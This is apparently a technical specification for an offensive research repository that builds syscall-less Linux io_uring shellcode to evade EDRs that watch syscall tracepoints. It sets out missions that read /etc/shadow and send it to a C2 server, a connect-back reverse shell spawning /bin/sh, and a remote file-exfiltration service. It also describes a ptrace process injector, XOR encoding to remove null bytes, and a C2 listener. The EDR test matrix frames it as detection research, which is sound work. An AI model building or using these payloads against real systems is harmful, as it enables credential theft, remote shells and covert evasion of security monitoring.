# I-OWN-URING — Technical Specification

## Overview

Research repository demonstrating syscall-less shellcode via Linux io_uring.
The primary contribution is showing that EDRs relying on `sys_enter` tracepoints
are blind to I/O operations routed through io_uring.

**Author:** Maycon Vitali (@maycon)  
**Target:** x86_64 Linux, kernel ≥ 5.1  
**Language:** C (PoC), NASM assembly (shellcode), Python (builder)

---

## Repository Layout

```
I-OWN-URING/
├── AGENTS.md
├── README.md
├── ROADMAP.md
├── Makefile                    # Top-level: builds all targets
│
├── poc/                        # Phase 1 — C PoCs (proof of concept)
│   ├── Makefile
│   ├── hello_uring.c           # Minimal file read via io_uring
│   ├── file_exfil_uring.c      # open→read→write chain, EDR comparison
│   └── sqpoll_uring.c          # SQPOLL mode (zero syscalls after setup)
│
├── shellcode/                  # Phase 2 — x64 assembly shellcode
│   ├── Makefile
│   ├── layer0_bootstrap.asm    # io_uring_setup + 3× mmap (~150 bytes)
│   ├── layer1_runtime.asm      # SQE submit + CQE consume engine (~400 bytes)
│   ├── missions/
│   │   ├── exfil_shadow.asm    # Built mission: openat/read_send(until EOF)/close
│   │   └── connect_back.asm    # Built mission: socket→connect→dup2×3→execve
│   ├── patch_config.py         # Patch IP/port into a built .bin via shellcode.h
│   ├── shellcode.h             # Patchable offsets for the combined binary
│   └── combined/
│       ├── shellcode.asm       # SOURCE base: bootstrap + runtime + mission stub
│       ├── shellcode.bin       # Combined binary
│       └── extract.py          # Dump raw bytes, strip nulls, print stats
│
├── builder/                    # Phase 4 — DSL → shellcode generator
│   ├── uring_builder.py        # Main generator script (pure string renderers)
│   ├── missions/               # YAML mission definitions
│   │   ├── exfil_shadow.yaml
│   │   ├── connect_back.yaml
│   │   └── connect_back_recv.yaml
│   └── tests/
│       └── test_builder.py
│
├── testing/                    # Phase 5 — test harness
│   ├── injector/
│   │   ├── inject_ptrace.c     # ptrace-based process injector
│   │   └── Makefile
│   ├── c2_server.py            # Minimal TCP listener for exfil validation
│   ├── run_matrix.sh           # Run shellcode under strace, falco, tetragon
│   └── results/
│       └── edr_matrix.md       # Populated by run_matrix.sh
│
└── paper/
    └── writeup.md              # Technical writeup (~20 pages)
```

---

## Phase 1 — C PoCs

### Constraints
- No liburing. All io_uring interaction via raw `syscall()`.
- All three ring regions mmap'd manually.
- Internal pointers computed from `io_uring_params` offsets at runtime.
- Each PoC prints strace-style commentary to stderr showing what syscalls are emitted.

### hello_uring.c
Reads `/etc/hostname` via `IORING_OP_READ`. Prints:
- All `io_uring_params` offsets as received from kernel
- Pointer arithmetic for SQ/CQ heads/tails
- CQE result

### file_exfil_uring.c
Sequence: `IORING_OP_OPENAT` → `IORING_OP_READ` → `IORING_OP_WRITE(stdout)` → `IORING_OP_CLOSE`.
Prints a side-by-side comparison of syscalls traditional vs io_uring paths.

### sqpoll_uring.c
`IORING_SETUP_SQPOLL` mode. Demonstrates that after setup, incrementing `sq_tail`
is sufficient to submit — no `io_uring_enter` call needed.
Includes a spin-loop CQE poller with 5ms timeout.

---

## Phase 2 — x64 Assembly Shellcode

### Hard Constraints
- **No libc.** Every syscall is a raw `syscall` instruction.
- **Position-independent.** Uses `call/pop` delta technique for all data references.
- **No null bytes** in delivery artifacts intended for null-terminated
  injection contexts. Raw baseline payloads may contain nulls because ptrace
  injection is length-aware; use `uring_builder.py --encode xor` to produce a
  null-free delivery artifact.
- `IORING_OP_CONNECT` requires kernel ≥ 5.5; `SEND`/`RECV` and the file
  operations used here require ≥ 5.6; `IORING_OP_SOCKET` requires ≥ 5.19.
  Every bundled network mission uses `IORING_OP_SOCKET`, so its effective
  minimum is kernel 5.19.
- Assembled with NASM (`nasm -f bin`).
- Each layer is assembled independently and concatenated.

### layer0_bootstrap.asm — Setup (~150 bytes target)

```
Registers on entry:  none assumed
Registers on exit:
  r12 = io_uring fd
  r13 = sq_ring base pointer
  r14 = cq_ring base pointer  
  r15 = sqes base pointer
  rbx = sq_tail pointer
  rbp = cq_head pointer
```

Sequence:
1. `io_uring_setup(32, &params)` — syscall 425
2. Read `params.sq_off.*` and `params.cq_off.*` to compute pointers
3. `mmap(0, sq_size, PROT_RW, MAP_SHARED|MAP_POPULATE, r12, IORING_OFF_SQ_RING)`
4. Check `IORING_FEAT_SINGLE_MMAP` flag; if set, skip mmap 2
5. `mmap(0, cq_size, …, IORING_OFF_CQ_RING)`
6. `mmap(0, sqes_size, …, IORING_OFF_SQES)`
7. Store all internal pointers in register-resident state

`params` struct: 120 bytes (zero-initialised at data section; the code
zeroes the whole stack frame, which covers it).
`io_sqring_offsets` starts at byte 40 of params.
`io_cqring_offsets` starts at byte 80 of params.

### layer1_runtime.asm — SQE/CQE Engine (~400 bytes target)

```nasm
; submit_sqe(opcode:al, fd:edi, addr:rsi, len:edx, off:r8, user_data:r9)
submit_sqe:
    ; 1. index = *sq_tail & *sq_ring_mask
    ; 2. sqe = sqes_base + index * 64
    ; 3. memset sqe 0 (64 bytes)
    ; 4. fill sqe fields
    ; 5. sq_array[index] = index
    ; 6. (*sq_tail)++
    ; 7. io_uring_enter(r12, 1, 1, IORING_ENTER_GETEVENTS, 0)
    ret

; consume_cqe() → rax=user_data, ecx=res  (or loop until cq_head != cq_tail)
consume_cqe:
    ; spin on cq_head == cq_tail
    ; index = cq_head & cq_ring_mask
    ; load cqe at index*16
    ; (*cq_head)++
    ret
```

### missions/exfil_shadow.asm (~300 bytes target)

Sequence using submit_sqe/consume_cqe:
1. `IORING_OP_OPENAT` — path = `/etc/shadow\0`, flags = O_RDONLY
2. `consume_cqe` → file_fd
3. `IORING_OP_READ` — fd=file_fd, buf=local_buf, len=4096
4. `consume_cqe` → bytes_read
5. `IORING_OP_SOCKET` — AF_INET, SOCK_STREAM, 0
6. `consume_cqe` → sock_fd
7. `IORING_OP_CONNECT` — fill sockaddr_in at runtime (IP/port configurable via offset)
8. `consume_cqe`
9. `IORING_OP_SEND` — sock_fd, buf, bytes_read, 0
10. `consume_cqe`
11. Exit: `mov $60, %rax; xor %rdi, %rdi; syscall`

**Configurable offsets** (documented in header comment):
- `CONFIG_IP` at offset +N from shellcode start: 4 bytes, network order
- `CONFIG_PORT` at offset +N+4: 2 bytes, network order

---

## Phase 3 — Builder / DSL

### Mission YAML format

```yaml
# missions/exfil_shadow.yaml
name: exfil_shadow
description: Read /etc/shadow and send to C2
requires_kernel: "5.19"
config:
  c2_ip: "127.0.0.1"       # overridable at generate time
  c2_port: 4444
ops:
  - openat:
      path: "/etc/shadow"
      flags: O_RDONLY
      result: file_fd
  - socket:
      domain: AF_INET
      type: SOCK_STREAM
      result: sock_fd
  - connect:
      fd: sock_fd
      ip: "{{ c2_ip }}"
      port: "{{ c2_port }}"
  - read_send:              # composite op: READ then SEND (chunk loop)
      until_eof: true       # repeat until read() returns 0 (EOF)
      fd: file_fd           # read source
      send_fd: sock_fd      # send target
      buf: auto             # builder allocates buffer in stack frame
      len: 4096
  - close:                  # teardown (result deliberately ignored)
      fd: file_fd
  - close:
      fd: sock_fd
```

### Native ops (non-io_uring)

Some operations have no io_uring equivalent that affects the real process
fd table (or are pointless through uring), so the DSL routes them as
direct `syscall` instructions (`NATIVE_RENDERERS`):

| op | syscall (x86_64) | notes |
|----|------------------|-------|
| `dup2` | 33 | `fd`/`new_fd`; `new_fd=0` uses `xor` (no null-byte push). Result checked in EAX (native ABI), not CQE ECX |
| `execve` | 59 | replaces the host process; argv pointer array built at frame `F_ARGV` (≤3 entries, NULL terminator comes from the pre-zeroed frame); envp = NULL; never returns, so no result check |

Both mission families in `builder/missions/`:

- **`connect_back.yaml` (classic)** — socket/connect go through io_uring
  (invisible to `sys_enter`-based EDRs), then 3× `dup2` + `execve("/bin/sh")`
  as native syscalls. After execve the host process *is* a `/bin/sh` with
  stdin/stdout/stderr on the socket. Requires kernel ≥ 5.19 (IORING_OP_SOCKET).
- **`connect_back_recv.yaml` (zero-exec)** — pure io_uring: C2 sends one
  filesystem path per line over a connected socket; shellcode opens it,
  streams the contents back in 4096-byte chunks until EOF, closes and
  repeats (`file_exfil_service`). Peer close (`recv == 0`) → clean exit.
  Requires kernel ≥ 5.19 because socket creation also uses
  `IORING_OP_SOCKET`. No native syscalls at all after setup.

Frame note: the combined shellcode zero-fills the frame (540 qwords =
4320 bytes) so unused `F_ARGV` slots are NULL for execve's argv array.

### Builder output

```
$ python3 builder/uring_builder.py missions/exfil_shadow.yaml --ip 192.168.1.1 --port 443

[*] Mission: exfil_shadow
[*] Layer 0: bootstrap (~150 bytes)
[*] Layer 1: runtime   (~400 bytes)
[*] Layer 2: mission   (mission-dependent)
[*] Total:              ~1 KB
[*] Null bytes: N       (irrelevant for ptrace; use --encode xor to deliver
                         through null-terminated buffers — see Roadmap #7)
[*] Output: shellcode.bin
[*] Header: shellcode.h  (offsets for CONFIG_IP, CONFIG_PORT)
```

`shellcode.h` example:
```c
#define SHELLCODE_SIZE     857
#define CONFIG_IP_OFFSET   724   // patch 4 bytes here for target IP
#define CONFIG_PORT_OFFSET 728   // patch 2 bytes here for target port
extern unsigned char shellcode[SHELLCODE_SIZE];
```

---

## Phase 4 — Testing Framework

### inject_ptrace.c

```c
// Usage: ./inject <pid> <shellcode.bin>
// Attaches via ptrace, backs up regs+memory at RIP,
// writes shellcode, sets RIP, detaches, waits, restores.
```

### run_matrix.sh

Runs shellcode under:
1. Raw (baseline)
2. `strace -e trace=all` (captures syscall visibility)
3. `falco` with default rules (syscall-based EDR sim)
4. `tetragon` with file-open policy (LSM-based EDR sim)

Outputs `results/edr_matrix.md` with ✓/✗ per mechanism.

### c2_server.py

```
$ python3 testing/c2_server.py --port 443 --output received.bin
[+] Listening on 0.0.0.0:443
[+] Connection from 127.0.0.1:54321
[+] Received 1423 bytes
[+] Saved to received.bin
[+] Validating: diff received.bin /etc/shadow → OK
```

---

## Build System

```makefile
# Top-level Makefile targets:
make poc          # Build all C PoCs
make shellcode    # Assemble all layers and missions
make builder      # Validate builder (run tests)
make inject       # Build ptrace injector
make test         # Run full test matrix (requires root for tetragon)
make clean        # Remove all build artifacts
```

### Dependencies
- NASM ≥ 2.14
- GCC ≥ 9
- Python ≥ 3.9 (builder + c2)
- PyYAML (part of the builder's Python deps)
- Linux kernel ≥ 5.19 for the bundled network missions
- Optional: falco, tetragon (for EDR matrix)

---

## Quality Criteria

Each deliverable is done when:

| Component | Done when |
|---|---|
| hello_uring.c | Reads /etc/hostname, prints io_uring debug info, `strace` output documented |
| file_exfil_uring.c | Full chain works, side-by-side strace comparison printed |
| sqpoll_uring.c | Ops complete without io_uring_enter after setup |
| layer0_bootstrap.asm | Assembled ≤160 bytes, no nulls, all pointers valid post-execution |
| layer1_runtime.asm | submit_sqe + consume_cqe work for all tested opcodes |
| exfil_shadow.asm | /etc/shadow received by c2_server.py on loopback |
| builder | `uring_builder.py exfil_shadow.yaml` produces working shellcode.bin |
| inject_ptrace.c | Shellcode executes in `/usr/bin/sleep` process without crash |
| run_matrix.sh | edr_matrix.md populated with ✓/✗ for all 4 mechanisms |
